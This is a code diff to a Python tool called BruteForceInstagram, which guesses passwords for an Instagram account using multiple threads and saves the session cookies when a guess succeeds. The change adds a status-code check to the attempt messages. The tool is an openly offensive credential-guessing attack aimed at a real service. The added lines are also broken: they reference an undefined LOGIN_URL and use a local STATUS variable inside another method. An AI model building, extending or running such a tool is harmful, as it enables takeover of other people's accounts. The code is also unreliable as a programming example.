@@ -36,6 +36,7 @@ BANNER = f"""
 class BruteForceInstagram:
     def __init__(self):
         self.target_url = "https://www.instagram.com/accounts/login/"
+        STATUS = requests.get(LOGIN_URL).status_code
         self.username = ""
         self.password_file = ""
         self.passwords = []
@@ -196,12 +197,12 @@ class BruteForceInstagram:
                     with self.lock:
                         self.found_password = password
                     # الطباعة الوحيدة عند النجاح
-                    print(Fore.GREEN + f"[+] Trying User: {Fore.YELLOW}{self.username} {Fore.GREEN}| Password: {Fore.YELLOW}{password} {Fore.GREEN} SUCCESS")
+                    print(Fore.GREEN + f"[+] Trying User: {Fore.YELLOW}{self.username} {Fore.GREEN}| Password: {Fore.YELLOW}{password} {Fore.GREEN} SUCCESS [S_code:{STATUS}]")
                     self.save_cookies(driver, password)
                     self.found_flag.set()
                     break
                 else:
-                    print(Fore.RED + f"[-] Trying User: {Fore.YELLOW}{self.username} {Fore.RED}| Password: {Fore.YELLOW}{password} {Fore.RED} FAILED")
+                    print(Fore.RED + f"[-] Trying User: {Fore.YELLOW}{self.username} {Fore.RED}| Password: {Fore.YELLOW}{password} {Fore.RED} FAILED [S_code:{STATUS}]")
 
                 self.password_queue.task_done()
         except Exception as e:
